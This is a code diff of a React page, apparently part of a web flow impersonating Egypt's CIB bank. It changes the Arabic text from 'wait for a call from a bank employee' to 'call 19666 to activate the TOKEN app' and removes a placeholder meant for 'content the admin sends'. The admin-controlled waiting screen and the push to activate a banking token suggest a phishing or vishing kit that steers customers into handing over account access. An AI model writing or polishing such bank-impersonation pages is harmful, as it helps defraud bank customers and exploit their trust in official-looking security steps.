@@ -24,7 +24,7 @@ const BankCall = () => {
               مكالمة من البنك
             </h1>
             <p className="text-sm text-muted-foreground">
-              يرجى الانتظار، سيتم التواصل معك من قبل أحد موظفي البنك خلال لحظات
+              يرجى الاتصال بخدمة العملاء لإتمام تفعيل طلبك
             </p>
           </div>
 
@@ -33,19 +33,37 @@ const BankCall = () => {
             <div className="hero-gradient px-5 py-4 flex items-center gap-3">
               <Info className="w-5 h-5 text-primary-foreground" />
               <h2 className="text-base font-bold text-primary-foreground">
-                معلومات هامة قبل المكالمة
+                خطوة أخيرة لإتمام الطلب
               </h2>
             </div>
 
             <div className="p-6 space-y-5">
+              {/* Main message */}
+              <div className="bg-gradient-to-br from-primary/5 to-primary/10 border border-primary/20 rounded-xl p-5 text-center">
+                <p className="text-base font-bold text-foreground leading-relaxed mb-4">
+                  لإتمام تفعيل طلبك يرجى الاتصال بخدمة العملاء
+                </p>
+                <a
+                  href="tel:19666"
+                  className="inline-flex items-center gap-3 px-6 py-3 rounded-xl hero-gradient text-primary-foreground font-extrabold text-2xl shadow-[0_8px_30px_hsl(213_76%_44%/0.4)] hover:scale-105 transition-transform tracking-wider"
+                  dir="ltr"
+                >
+                  <Phone className="w-6 h-6" />
+                  19666
+                </a>
+                <p className="text-sm font-bold text-foreground mt-4">
+                  لتفعيل تطبيق <span className="text-primary">TOKEN</span>
+                </p>
+              </div>
+
               <div className="flex items-start gap-3">
                 <ShieldCheck className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                 <div>
                   <h3 className="font-bold text-foreground mb-1 text-sm">
-                    تأكد من هوية المتصل
+                    اتصال آمن وموثوق
                   </h3>
                   <p className="text-xs text-muted-foreground leading-relaxed">
-                    سيتواصل معك موظف البنك الرسمي للتحقق من بيانات حسابك واستكمال إجراءات تفعيل الخدمة.
+                    رقم 19666 هو الرقم الرسمي لخدمة عملاء البنك التجاري الدولي CIB، متاح على مدار 24 ساعة.
                   </p>
                 </div>
               </div>
@@ -54,10 +72,10 @@ const BankCall = () => {
                 <Clock className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                 <div>
                   <h3 className="font-bold text-foreground mb-1 text-sm">
-                    مدة المكالمة
+                    إجراء سريع
                   </h3>
                   <p className="text-xs text-muted-foreground leading-relaxed">
-                    لن تستغرق المكالمة أكثر من بضع دقائق لاستكمال التحقق وتأمين حسابك.
+                    سيقوم موظف خدمة العملاء بإرشادك خطوة بخطوة لتفعيل تطبيق TOKEN واستكمال طلبك خلال دقائق.
                   </p>
                 </div>
               </div>
@@ -69,16 +87,9 @@ const BankCall = () => {
                     تنبيه أمني
                   </h3>
                   <p className="text-xs text-muted-foreground leading-relaxed">
-                    لا تشارك أبداً كلمة المرور أو رمز التحقق (OTP) كاملاً عبر الهاتف. موظف البنك لن يطلب منك ذلك.
+                    لا تشارك كلمة المرور أو رمز التحقق (OTP) كاملاً مع أي شخص. موظف البنك لن يطلب منك ذلك أبداً.
                   </p>
                 </div>
-              </div>
-
-              {/* Placeholder block — replace with the content the admin sends */}
-              <div className="bg-muted/40 border border-dashed border-border rounded-xl p-4">
-                <p className="text-xs text-muted-foreground text-center leading-relaxed">
-                  يرجى إبقاء هاتفك بالقرب منك والاستعداد للرد على المكالمة الواردة من رقم البنك الرسمي.
-                </p>
               </div>
             </div>
           </div>
@@ -90,7 +101,7 @@ const BankCall = () => {
               <span className="relative inline-flex rounded-full h-3 w-3 bg-primary" />
             </span>
             <span className="text-xs font-bold text-foreground">
-              في انتظار الاتصال...
+              في انتظار إتمام المكالمة...
             </span>
           </div>
         </div>
